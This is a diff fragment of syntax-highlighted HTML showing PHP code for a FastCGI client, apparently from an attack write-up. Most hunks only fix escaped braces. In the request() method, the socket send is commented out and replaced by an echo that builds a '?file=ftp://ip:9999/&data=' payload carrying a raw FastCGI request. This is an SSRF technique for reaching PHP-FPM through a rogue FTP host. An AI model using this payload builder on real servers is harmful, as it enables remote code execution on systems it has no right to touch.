-            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;$p++&amp;#125;);</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                 <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;$p++&amp;#125;) &lt;&lt; 16);</span>
-                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;$p++&amp;#125;) &lt;&lt; 8);</span>
-                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;$p++&amp;#125;));</span>
-            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;$p++&amp;#125;);</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                 <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;$p++&amp;#125;) &lt;&lt; 16);</span>
-                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;$p++&amp;#125;) &lt;&lt; 8);</span>
-                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;$p++&amp;#125;));</span>
-            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
             <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token variable">$p</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token punctuation">}</span>
         <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token punctuation">}</span>
     <span class="token comment" spellcheck="true">/**
      * Decode a FastCGI Packet
      *
@@ -565,41 +567,41 @@ conn<span class="token punctuation">.</span><span class="token function">close</
      * @return array
      */</span>
     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token punctuation">{</span>
         <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;0&amp;#125;);</span>
-        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;1&amp;#125;);</span>
-        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;2&amp;#125;) &lt;&lt; 8) + ord($data&amp;#123;3&amp;#125;);</span>
-        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;4&amp;#125;) &lt;&lt; 8) + ord($data&amp;#123;5&amp;#125;);</span>
-        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;6&amp;#125;);</span>
-        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;7&amp;#125;);</span>
+        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">7</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token punctuation">}</span>
     <span class="token comment" spellcheck="true">/**
      * Read a FastCGI Packet
      *
      * @return array
      */</span>
     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                 <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                     <span class="token variable">$len</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                     <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>
-                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                 <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+            <span class="token punctuation">}</span>
             <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
             <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
     <span class="token comment" spellcheck="true">/**
      * Get Informations on the FastCGI application
      *
@@ -607,20 +609,20 @@ conn<span class="token punctuation">.</span><span class="token function">close</
      * @return array
      */</span>
     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getValues</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token punctuation">{</span>
         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token punctuation">}</span>
         <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
             <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
     <span class="token comment" spellcheck="true">/**
      * Execute a request to the FastCGI application
      *
@@ -629,35 +631,35 @@ conn<span class="token punctuation">.</span><span class="token function">close</
      * @return String
      */</span>
     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token punctuation">{</span>
         <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
 <span class="token comment" spellcheck="true">//        $this->connect();</span>
         <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token variable">$paramsRequest</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token punctuation">}</span>
         <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token punctuation">}</span>
         <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">echo</span><span class="token punctuation">(</span>'<span class="token operator">?</span>file<span class="token operator">=</span>ftp<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//ip:9999/&amp;data='.urlencode($request));</span>
 <span class="token comment" spellcheck="true">//        fwrite($this->_sock, $request);</span>
-<span class="token comment" spellcheck="true">//        do &amp;#123;</span>
+<span class="token comment" spellcheck="true">//        do {</span>
 <span class="token comment" spellcheck="true">//            $resp = $this->readPacket();</span>
-<span class="token comment" spellcheck="true">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &amp;#123;</span>
+<span class="token comment" spellcheck="true">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {</span>
 <span class="token comment" spellcheck="true">//                $response .= $resp['content'];</span>
-<span class="token comment" spellcheck="true">//            &amp;#125;</span>
-<span class="token comment" spellcheck="true">//        &amp;#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span>
+<span class="token comment" spellcheck="true">//            }</span>
+<span class="token comment" spellcheck="true">//        } while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span>
 <span class="token comment" spellcheck="true">//        var_dump($resp);</span>
-<span class="token comment" spellcheck="true">//        if (!is_array($resp)) &amp;#123;</span>
